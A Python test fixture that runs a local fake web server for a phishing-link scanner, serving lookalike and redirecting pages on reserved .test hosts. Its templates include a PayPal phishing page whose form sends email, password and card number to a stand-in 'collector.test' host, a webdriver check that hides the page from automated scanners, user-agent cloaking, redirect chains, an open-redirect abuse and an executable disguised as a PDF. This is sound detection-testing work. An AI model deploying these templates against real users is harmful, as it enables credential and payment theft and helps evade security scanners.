"""A tiny local web server that plays the part of the internet in tests and in demo mode.

Virtual hosts are chosen by the Host header, so one process can be `login-paypa1.test`, `short.test`, `www.paypal.com`, ...
Nothing here touches the real network. Names ending in .test are reserved (RFC 2606) and never resolve publicly.
"""
from __future__ import annotations

import http.server
import threading
import time
from urllib.parse import parse_qs, urlsplit

PHISH_HTML = """<!doctype html><html lang="en"><head><title>PayPal - Log in to your account</title>
<meta property="og:site_name" content="PayPal"><style>.ghost{{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;opacity:0}}</style>
<script>if (navigator.webdriver) {{ document.body.innerHTML = ''; }}</script></head>
<body><img alt="PayPal logo" src="/logo.png"><h1>Your account has been suspended</h1>
<p>We noticed unusual activity on your PayPal account. Verify your identity within 24 hours to avoid permanent suspension. Act now.</p>
<form action="http://collector.test:{port}/post.php" method="post"><input type="email" name="email" placeholder="Email address">
<input type="password" name="password" placeholder="Password"><input name="card_number" placeholder="Card number"><button>Log in</button></form>
<div class="ghost"><a href="/x">.</a></div><iframe src="http://tracker.test:{port}/frame" width="0" height="0"></iframe></body></html>"""
CLEAN_HTML = """<!doctype html><html lang="en"><head><title>Community garden newsletter</title></head><body><h1>Spring planting day</h1>
<p>Join us on Saturday to plant tomatoes, beans and sunflowers. Bring gloves and a friend. Tea and biscuits will be served in the shed after the work is done.</p>
<a href="/archive">Past newsletters</a></body></html>"""
CLOAK_BENIGN = "<!doctype html><html><head><title>Coming soon</title></head><body><p>This site is under construction.</p></body></html>"


class _Handler(http.server.BaseHTTPRequestHandler):
    server_version = "FixtureSite/1.0"

    def log_message(self, *args):  # silence
        pass

    def _send(self, status=200, body=b"", ctype="text/html; charset=utf-8", headers=None):
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        for k, v in (headers or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):  # noqa: N802
        host = (self.headers.get("Host") or "").split(":")[0].lower()
        self.server.hits.append((host, self.path))   # lets security tests prove that nothing was contacted
        port = self.server.server_address[1]
        parts = urlsplit(self.path)
        ua = self.headers.get("User-Agent", "")
        scanner = "UnmaskLinkScanner" in ua
        if host == "login-paypa1.test":
            return self._send(body=PHISH_HTML.format(port=port).encode())
        if host == "short.test":
            return self._send(302, headers={"Location": f"http://hop.test:{port}/next"})
        if host == "hop.test":
            return self._send(302, headers={"Location": f"http://login-paypa1.test:{port}/signin"})
        if host == "www.paypal.com" and parts.path == "/go":   # a trusted site with an open redirect
            target = parse_qs(parts.query).get("url", ["/"])[0]
            return self._send(302, headers={"Location": target})
        if host == "dl.test":
            return self._send(body=b"MZ\x90\x00\x03" + b"\x00" * 200, ctype="application/pdf")
        if host == "cloak.test":
            return self._send(body=(CLOAK_BENIGN if scanner else PHISH_HTML.format(port=port)).encode())
        if host == "meta.test":
            return self._send(body=f'<html><head><meta http-equiv="refresh" content="0; url=http://login-paypa1.test:{port}/signin"></head><body>Redirecting…</body></html>'.encode())
        if host == "js.test":
            return self._send(body=f'<html><body><script>window.location = "http://login-paypa1.test:{port}/signin";</script></body></html>'.encode())
        if host == "loop.test":
            return self._send(302, headers={"Location": f"http://loop.test:{port}/again"})
        if host == "slow.test":   # a deliberately slow server, to watch the report fill in while the scan is still running
            time.sleep(3.0)
            return self._send(body=CLEAN_HTML.encode())
        if host == "blocked.test":
            return self._send(body=CLEAN_HTML.encode())
        return self._send(body=CLEAN_HTML.encode())  # news.test and anything else: an ordinary page


class FixtureSite:
    def __init__(self, port: int = 0) -> None:
        self._server = http.server.ThreadingHTTPServer(("127.0.0.1", port), _Handler)
        self._server.daemon_threads = True
        self._server.hits = []
        self.port: int = self._server.server_address[1]
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)

    HOSTS = ("login-paypa1.test", "short.test", "hop.test", "www.paypal.com", "dl.test", "cloak.test", "meta.test", "js.test", "loop.test",
             "news.test", "collector.test", "tracker.test", "slow.test")

    def start(self) -> "FixtureSite":
        self._thread.start()
        return self

    def stop(self) -> None:
        self._server.shutdown()
        self._server.server_close()

    @property
    def hits(self) -> list:
        return self._server.hits

    def url(self, host: str, path: str = "/") -> str:
        return f"http://{host}:{self.port}{path}"

    @property
    def host_map(self) -> dict[str, str]:
        return {h: "127.0.0.1" for h in self.HOSTS}
